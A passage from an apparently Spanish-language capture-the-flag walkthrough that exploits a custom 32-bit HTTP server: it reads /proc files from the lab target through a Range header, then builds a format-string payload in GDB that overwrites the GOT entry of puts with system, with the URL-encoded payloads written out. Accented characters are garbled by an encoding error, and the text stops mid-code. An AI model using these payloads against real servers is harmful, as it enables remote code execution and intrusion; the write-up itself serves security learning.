<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((local_c10 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'R'</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> ((local_c0f </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'a'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (local_c0e </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'n'</span><span class="mtk1">)))) {</span>
<span class="mtk1">      </span><span class="mtk8">__isoc99_sscanf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">local_c10, </span><span class="mtk4">"Range: bytes=</span><span class="mtk6">%lu</span><span class="mtk4">-</span><span class="mtk6">%lu</span><span class="mtk4">"</span><span class="mtk1">, param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">800</span><span class="mtk1">, param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">804</span><span class="mtk1">);</span>  

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">804</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">804</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">804</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">      }</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">  local_1028 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">local_410;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_410 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'/'</span><span class="mtk1">) {</span>
<span class="mtk1">    local_1028 </span><span class="mtk5">=</span><span class="mtk1"> acStack1039;</span>
<span class="mtk1">    sVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(local_1028);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (sVar1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      local_1028 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"./index.html"</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">for</span><span class="mtk1"> (local_1024 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; local_1024 </span><span class="mtk5">&lt;</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) sVar1; local_1024 </span><span class="mtk5">=</span><span class="mtk1"> local_1024 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (local_1028[local_1024] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'?'</span><span class="mtk1">) {</span>
<span class="mtk1">          local_1028[local_1024] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">          </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">      }</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">strcpy</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">), local_810);</span>
<span class="mtk1">  </span><span class="mtk8">url_decode</span><span class="mtk1">(local_1028, param_2, </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_10 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail_local</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Hay un punto en el que el programa mira si est谩 la cabecera <code>Range</code>. Esta cabecera se puede usar para indicar al servidor la cantidad de bytes que queremos recibir. Vamos a probar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/maps -H <span class="code-dark-yellow">'Range: bytes=0-1000000'</span>
565ab000-565ac000 r--p 00000000 08:02 46784                              /opt/www/httpserver  
565ac000-565ae000 r-xp 00001000 08:02 46784                              /opt/www/httpserver
565ae000-565af000 r--p 00003000 08:02 46784                              /opt/www/httpserver
565af000-565b0000 r--p 00003000 08:02 46784                              /opt/www/httpserver
565b0000-565b1000 rw-p 00004000 08:02 46784                              /opt/www/httpserver
57c42000-57c64000 rw-p 00000000 00:00 0                                  [heap]
f7dad000-f7f7f000 r-xp 00000000 08:02 46904                              /lib32/libc-2.27.so
f7f7f000-f7f80000 ---p 001d2000 08:02 46904                              /lib32/libc-2.27.so
f7f80000-f7f82000 r--p 001d2000 08:02 46904                              /lib32/libc-2.27.so
f7f82000-f7f83000 rw-p 001d4000 08:02 46904                              /lib32/libc-2.27.so
f7f83000-f7f86000 rw-p 00000000 00:00 0
f7f8f000-f7f91000 rw-p 00000000 00:00 0
f7f91000-f7f94000 r--p 00000000 00:00 0                                  [vvar]
f7f94000-f7f96000 r-xp 00000000 00:00 0                                  [vdso]
f7f96000-f7fbc000 r-xp 00000000 08:02 46900                              /lib32/ld-2.27.so
f7fbc000-f7fbd000 r--p 00025000 08:02 46900                              /lib32/ld-2.27.so
f7fbd000-f7fbe000 rw-p 00026000 08:02 46900                              /lib32/ld-2.27.so
ffea8000-ffec9000 rw-p 00000000 00:00 0                                  [stack]
curl: (18) transfer closed with 998488 bytes remaining to read
</code></pre></div><p>Genial, hemos podido obtener el archivo correctamente. Adem谩s, podemos aplicar la misma cabecera para leer <code>/proc/self/cmdline</code> y <code>/proc/self/environ</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/cmdline -H <span class="code-dark-yellow">'Range: bytes=0-1000000'</span> -so -
./httpserver

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/environ -H <span class="code-dark-yellow">'Range: bytes=0-1000000'</span> -so - | <span class="code-dark-green">tr</span> <span class="code-dark-yellow">'\0'</span> <span class="code-dark-yellow">'\n'</span>  
LANG=en_US.UTF-8
SUDO_GID=0
USERNAME=john
SUDO_COMMAND=/opt/www/run.sh
USER=john
PWD=/opt/www
HOME=/root
SUDO_USER=root
SUDO_UID=0
MAIL=/var/mail/john
TERM=unknown
SHELL=/bin/bash
SHLVL=1
LOGNAME=john
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
OLDPWD=/root
_=./httpserver
</code></pre></div><p>El archivo <code>/proc/self/maps</code> ser谩 煤til para la explotaci贸n de <em>Format String</em>, ya que tenemos la direcci贸n base del binario y de Glibc. De hecho, el binario est谩 protegido con NX, PIE y el canario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">checksec</span> <span class="mtku">httpserver</span>
[<span class="code-blue">*</span>] './httpserver'
    Arch:     i386-32-little  
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled
</code></pre></div><p>Por tanto, para calcular una direcci贸n de una funci贸n en tiempo de ejecuci贸n, tenemos que usar una direcci贸n base y el correspondiente <em>offset</em> (ya sea del binario o de Glibc), ya que ASLR est谩 habilitado en la m谩quina (aparece un <code>2</code> en <code>/proc/sys/kernel/randomize_va_space</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/sys/kernel/randomize_va_space -H <span class="code-dark-yellow">'Range: bytes=0-1000000'</span> -so -  
2
</code></pre></div><h3 id="explotaci贸n-de-_format-string_">Explotaci贸n de <em>Format String</em></h3><p>Vamos a ejecutar el binario en local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
listen on port 9999, fd is 3  
</code></pre></div><p>Ahora podemos ver la vulnerabilidad de <em>Format String</em> (n贸tese que <code>%x</code> tiene que ser codificado en URL como <code>%25x</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:9999
File not found

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:9999/%25x.%25x.%25x.%25x  
File not found
</code></pre></div><p>El <em>payload</em> funciona, ya que vemos algunos valores en hexadecimal (<code>%x</code> es una <em>format string</em> que muestra un valor como n煤mero hexadecimal), que son datos de la pila (<em>stack</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
listen on port 9999, fd is 3
accept request, fd is 4, pid is 67081
127.0.0.1:34232 404 - ./index.html
request method:
GET
accept request, fd is 4, pid is 67139
127.0.0.1:34236 404 - f7f8f0dc.85bc.194.ffca3898  
request method:
GET
</code></pre></div><p>Para poder explotar una vulnerabilidad de <em>Format String</em> como esta, tenemos que obtener la posici贸n en la pila donde se almacena nuestro <em>payload</em> (s铆, el <em>payload</em> que le pasamos al binario se almacena en el <em>stack</em> tambi茅n):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:9999/<span class="code-dark-magenta">$(</span><span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("%25x." * 100)'</span><span class="code-dark-magenta">)</span>  
File not found
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
listen on port 9999, fd is 3
...
accept request, fd is 4, pid is 78524
127.0.0.1:34254 404 - f7f8f0dc.85ce.194.ffca3898.ffca3084.ffca38dc.194.ffca3898.f7facad4.2e.91acc300.56659000.f7f74000.ffca3898.566566e3.194.ffca38dc.ffca3084.56657401.ffca3054.ffca3050.ffca38dc.4.f7fc2000.f7f965d0.194.0.ffffffff.56657401.ffca3050.42dedaf.ffca30e4.f7f8e3e0.f7f8e760.1.0.1.f7f76098.f7f74000.5712f008.f7e85ea0.5712f000.f7e85f58.57130000.85bdb5ef.f7f8e2d0.ffca30e4.f7d9bd81.f7fa16bd.f7d901fc.f7f74740.1000.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.  
request method:
GET
</code></pre></div><p>Si contamos los puntos, veremos que nuestro <em>payload</em> aparece en la posici贸n 53. Podemos comprobarlo mediante <code>%53$x</code> (codificado como <code>%2553%24x</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:9999/%2553%24x
File not found

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:9999/ABCD%2553%24x  
File not found
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
listen on port 9999, fd is 3
...
accept request, fd is 4, pid is 82102  
127.0.0.1:34264 404 - 24333525
request method:
GET
accept request, fd is 4, pid is 82381
127.0.0.1:34268 404 - ABCD44434241
request method:
GET
</code></pre></div><p>Como se puede observar, si enviamos <code>%53$x</code>, recibimos <code>24333525</code>, que es <code>%53$x</code> en formato hexadecimal (<em>little-endian</em>). Y si a帽adimos <code>ABCD</code> al principio, vemos <code>ABCD</code> m谩s <code>44434241</code> (que es <code>ABCD</code> en formato hexadecimal, <em>little-endian</em>).</p><p>Las vulnerabilidades de <em>Format String</em> no solamente permiten leer valores arbitrarios de la pila, tambi茅n permiten escribir datos arbitrarios usando <code>%n</code>. La manera en la que <code>%n</code> funciona es que escribe el n煤mero de bytes impresos hasta la <em>format string</em> (<code>%n</code>) en la direcci贸n que est谩 referenciada. Por ejemplo, introducir <code>1234%5$n</code> en <code>printf</code> significa escribir <code>4</code> en la direcci贸n que aparece en la quinta posici贸n de la pila.</p><p>Como tenemos control sobre la pila a partir de la posici贸n 53, podemos a帽adir una direcci贸n arbitraria ah铆 y escribir datos arbitrarios en dicha direcci贸n usando <code>%53$n</code>. Adem谩s, si tuvi茅ramos que imprimir una gran cantidad de bytes, podr铆amos abusar de otra <em>format string</em>, que es <code>%c</code>. Al usar <code>%1234c</code> imprimiremos 1234 espacios en blanco (en lugar de enviar dicha cantidad de caracteres).</p><p>Entonces, 驴cu谩l es la estrategia de explotaci贸n? Como el binario tiene <em>Partial</em> RELRO, entonces podemos modificar la Tabla de <em>Offsets</em> Globales (<em>Global Offset Table</em>, GOT). Esta tabla contiene las direcciones de las funciones externas en tiempo de ejecuci贸n (si han sido llamadas al menos una vez, si no, apuntan a otra direcci贸n para realizar la resoluci贸n de direcciones).</p><p>La idea es modificar la direcci贸n de una funci贸n de Glibc para que apunte a <code>system</code>. Las mejores funciones para esto son las que reciben una <em>string</em> como primer argumento (por ejemplo, <code>printf</code>, <code>strlen</code> o <code>puts</code>), la que luego podemos introducir directamente una <em>string</em> con un comando de sistema que ser谩 ejecutado por <code>system</code>.</p><p>Vamos a usar GDB para depurar un poco. Como se trata de un servidor que usa <code>fork</code>, tenemos que poner las siguientes configuraciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">httpserver</span>
Reading symbols from <span class="code-dark-green">httpserver</span>...
(No debugging symbols found in <span class="code-dark-green">httpserver</span>)  
<span class="code-red">gef  </span>set follow-fork-mode child
<span class="code-red">gef  </span>set detach-on-fork off
<span class="code-red">gef  </span>run
Starting program: ./httpserver
listen on port 9999, fd is 3
^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0xf7fcf549</span> in <span class="code-dark-yellow">__kernel_vsyscall</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef  </span>got

GOT protection: Partial RelRO | GOT functions: 43

[0x5655a00c] <span class="code-dark-green">setsockopt@GLIBC_2.0    0xf7ecb570</span>
[0x5655a010] <span class="code-dark-yellow">strcmp@GLIBC_2.0    0x56556046</span>
[0x5655a014] <span class="code-dark-yellow">read@GLIBC_2.0    0x56556056</span>
[0x5655a018] <span class="code-dark-green">printf@GLIBC_2.0    0xf7e16d30</span>
[0x5655a01c] <span class="code-dark-yellow">memcpy@GLIBC_2.0    0x56556076</span>
[0x5655a020] <span class="code-dark-yellow">inet_ntoa@GLIBC_2.0    0x56556086</span>
...
[0x5655a040] <span class="code-dark-yellow">strcpy@GLIBC_2.0    0x56556106</span>
[0x5655a044] <span class="code-dark-yellow">getpid@GLIBC_2.0    0x56556116</span>
[0x5655a048] <span class="code-dark-yellow">puts@GLIBC_2.0    0x56556126</span>
[0x5655a04c] <span class="code-dark-yellow">__fxstat@GLIBC_2.0    0x56556136</span>
...
[0x5655a068] <span class="code-dark-green">getcwd@GLIBC_2.0    0xf7eb83a0</span>
[0x5655a06c] <span class="code-dark-yellow">strlen@GLIBC_2.0    0x565561b6</span>
[0x5655a070] <span class="code-dark-green">__libc_start_main@GLIBC_2.0    0xf7de1de0</span>
[0x5655a074] <span class="code-dark-yellow">write@GLIBC_2.0    0x565561d6</span>
[0x5655a078] <span class="code-dark-green">bind@GLIBC_2.0    0xf7ecaf30</span>
[0x5655a07c] <span class="code-dark-yellow">__isoc99_sscanf@GLIBC_2.7    0x565561f6</span>
...
[0x5655a0a8] <span class="code-dark-yellow">atoi@GLIBC_2.0    0x565562a6</span>
[0x5655a0ac] <span class="code-dark-green">socket@GLIBC_2.0    0xf7ecb660</span>
[0x5655a0b0] <span class="code-dark-yellow">close@GLIBC_2.0    0x565562c6</span>
[0x5655a0b4] <span class="code-dark-yellow">closedir@GLIBC_2.0    0x565562d6</span>
<span class="code-green">gef  </span>p system
$1 = {&lt;text variable, no debug info&gt;} <span class="code-dark-blue">0xf7e08360</span> &lt;<span class="code-dark-yellow">system</span>&gt;  
<span class="code-green">gef  </span>continue
Continuing.
</code></pre></div><p>Como se puede ver, la entrada de <code>puts</code> aparece en la direcci贸n <code>0x5655a048</code> (a煤n no apunta a una direcci贸n real porque no ha sido llamada a煤n), y <code>system</code> est谩 en <code>0xf7e08360</code>. Vamos a comenzar por sobrescribir la direcci贸n entera de <code>puts</code> por <code>0xff</code> (255). Para ello, podemos usar este <em>payload</em>: <code>"%255c%56$n--\x48\xa0\x55\x56"</code>. N贸tese que en la pila, este <em>payload</em> se guarda en palabras de 4 bytes (32 bits):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -ne <span class="code-dark-yellow">'%255c%56$n--\x48\xa0\x55\x56'</span> | <span class="code-dark-green">xxd</span> -c 4 -g 4  
00000000: 25323535  %255
00000004: 63253536  c%56
00000008: 246e2d2d  $n--
0000000c: 48a05556  H.UV
</code></pre></div><p>N贸tese tambi茅n que <code>--</code> es solo para rellenar el <em>payload</em> y que las direcciones queden ajustadas a una posici贸n del <em>stack</em> (particularmente, la posici贸n 56). Antes de verificarlo, vamos a poner un <em>breakpoint</em> antes de la llamada vulnerable a <code>printf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>^C
Program received signal SIGINT, Interrupt.  
<span class="code-dark-blue">0xf7fcf549</span> in <span class="code-dark-yellow">__kernel_vsyscall</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef  </span>disassemble log_access
Dump of assembler code for function log_access:
   <span class="code-dark-blue">0x56557077</span> &lt;+0&gt;:     push   ebp
   <span class="code-dark-blue">0x56557078</span> &lt;+1&gt;:     mov    ebp,esp
   <span class="code-dark-blue">0x5655707a</span> &lt;+3&gt;:     push   esi
   <span class="code-dark-blue">0x5655707b</span> &lt;+4&gt;:     push   ebx
   <span class="code-dark-blue">0x5655707c</span> &lt;+5&gt;:     sub    esp,0x20
   ...
   <span class="code-dark-blue">0x565570e5</span> &lt;+110&gt;:   mov    eax,DWORD PTR [ebp-0x24]
   <span class="code-dark-blue">0x565570e8</span> &lt;+113&gt;:   sub    esp,0xc
   <span class="code-dark-blue">0x565570eb</span> &lt;+116&gt;:   push   eax
   <span class="code-dark-blue">0x565570ec</span> &lt;+117&gt;:   call   <span class="code-dark-blue">0x56556060</span> &lt;<span class="code-dark-yellow">printf@plt</span>&gt;  
   <span class="code-dark-blue">0x565570f1</span> &lt;+122&gt;:   add    esp,0x10
   <span class="code-dark-blue">0x565570f4</span> &lt;+125&gt;:   sub    esp,0xc
   <span class="code-dark-blue">0x565570f7</span> &lt;+128&gt;:   lea    eax,[ebx-0x1e1e]
   <span class="code-dark-blue">0x565570fd</span> &lt;+134&gt;:   push   eax
   <span class="code-dark-blue">0x565570fe</span> &lt;+135&gt;:   call   <span class="code-dark-blue">0x56556120</span> &lt;<span class="code-dark-yellow">puts@plt</span>&gt;
   <span class="code-dark-blue">0x56557103</span> &lt;+140&gt;:   add    esp,0x10
   <span class="code-dark-blue">0x56557106</span> &lt;+143&gt;:   sub    esp,0xc
   <span class="code-dark-blue">0x56557109</span> &lt;+146&gt;:   lea    eax,[ebx-0x1d50]
   <span class="code-dark-blue">0x5655710f</span> &lt;+152&gt;:   push   eax
   <span class="code-dark-blue">0x56557110</span> &lt;+153&gt;:   call   <span class="code-dark-blue">0x56556120</span> &lt;<span class="code-dark-yellow">puts@plt</span>&gt;
   ...
End of assembler dump.
<span class="code-green">gef  </span>break *log_access+122
Breakpoint 1 at <span class="code-dark-blue">0x565570f1</span>
<span class="code-green">gef  </span>continue
Continuing.
</code></pre></div><p>Tambi茅n tenemos que codificar los datos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:9999/%25255c%2556%24n--%48%a0%55%56  
File not found
</code></pre></div><p>En este punto, la entrada de <code>puts</code> en la GOT ahora deber铆a valer <code>0xff</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef  </span>got

GOT protection: Partial RelRO | GOT functions: 43  

...
[0x5655a048] <span class="code-dark-green">puts@GLIBC_2.0    0xff</span>
[0x5655a04c] <span class="code-dark-yellow">__fxstat@GLIBC_2.0    0x56556136</span>
[0x5655a050] <span class="code-dark-yellow">sendfile@GLIBC_2.1    0x56556146</span>
[0x5655a054] <span class="code-dark-yellow">exit@GLIBC_2.0    0x56556156</span>
[0x5655a058] <span class="code-dark-green">open@GLIBC_2.0    0xf7eb7120</span>
...
<span class="code-green">gef  </span>continue
Continuing.
</code></pre></div><p>Y ah铆 est谩. Sin embargo, tenemos que introducir un valor mucho m谩s grande para poder poner la direcci贸n de <code>system</code>. Para conseguir esto, podemos usar <code>%hhn</code> para escribir un solo byte.</p><p>Vamos a hacerlo a mano: la direcci贸n de <code>system</code> est谩 en <code>0xf7e08360</code>, por lo que el primer byte lo sobrescribimos con <code>0x60</code> (96 en decimal), el segundo con <code>0x83</code> (131), el tercero con <code>0xe0</code> (224 en decimal), y el 煤ltimo con <code>0xf7</code> (247 en decimal).</p><p>Manualmente, la primera sobrescritura tiene que ser con el <em>payload</em> <code>"%96c%56$hhn-\x48\xa0\x55\x56"</code>. Ahora para el segundo byte, el <em>payload</em> ser谩 <code>"%30c%60$hhn-\x49\xa0\x55\x56"</code> (n贸tese que <code>30 = 131 - 96 - 4 - 1</code>, porque ya hemos impreso 96 caracteres, m谩s la direcci贸n de 4 bytes m谩s el relleno <code>-</code>; y tambi茅n que estamos escribiendo en <code>0x5655a048 + 1 = 0x5655a049</code>). El tercer byte ser谩 sobrescrito con el <em>payload</em> <code>"%88c%64$hhn-\x4a\xa0\x55\x56"</code>. Y el 煤ltimo byte, con <code>"%18c%68$hhn-\x4b\xa0\x55\x56"</code>. Por tanto, tenemos este <em>payload</em> completo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">%96c%56$hhn-\x48\xa0\x55\x56%30c%60$hhn-\x49\xa0\x55\x56%88c%64$hhn-\x4a\xa0\x55\x56%18c%68$hhn-\x4b\xa0\x55\x56  
</code></pre></div><p>Vamos a probarlo (usando codificaci贸n URL):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:9999/%2596c%2556%24hhn-%48%a0%55%56%2530c%2560%24hhn-%49%a0%55%56%2588c%2564%24hhn-%4a%a0%55%56%2519c%2568%24hhn-%4b%a0%55%56  
File not found
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[Attaching after process 192000 fork to child process 192115]
[New inferior 2 (process 192115)]
accept request, fd is 4, pid is 192115
[Switching to process 192115]

Thread 2.1 "httpserver" hit Breakpoint 1, <span class="code-dark-blue">0x565570f1</span> in <span class="code-dark-yellow">log_access</span> ()  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef  </span>p system
$2 = {&lt;text variable, no debug info&gt;} <span class="code-dark-blue">0xf7e08360</span> &lt;<span class="code-dark-yellow">system</span>&gt;
<span class="code-green">gef  </span>got

GOT protection: Partial RelRO | GOT functions: 43

...
[0x5655a048] <span class="code-dark-green">puts@GLIBC_2.0    0xf7e08360</span>
[0x5655a04c] <span class="code-dark-yellow">__fxstat@GLIBC_2.0    0x56556136</span>
[0x5655a050] <span class="code-dark-yellow">sendfile@GLIBC_2.1    0x56556146</span>
[0x5655a054] <span class="code-dark-yellow">exit@GLIBC_2.0    0x56556156</span>
[0x5655a058] <span class="code-dark-green">open@GLIBC_2.0    0xf7eb7120</span>
...
<span class="code-green">gef  </span>continue
Continuing.
[Attaching after process 203855 vfork to child process 206427]
[New inferior 3 (process 206427)]
process 206427 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.  
Error in re-setting breakpoint 1: No symbol "log_access" in current context.
Error in re-setting breakpoint 1: No symbol "log_access" in current context.
Error in re-setting breakpoint 1: No symbol "log_access" in current context.
[Inferior 3 (process 206427) exited normally]
</code></pre></div><p>隆Ah铆 est谩! Ahora <code>puts</code> es <code>system</code>. Recordemos la siguiente porci贸n de c贸digo de la funci贸n <code>log_access</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">log_access</span><span class="mtk1">(undefined4 </span><span class="mtk9 mtki">param_1</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_2</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">param_3</span><span class="mtk1">) {</span>  
<span class="mtk1">  </span><span class="mtk3">// ...

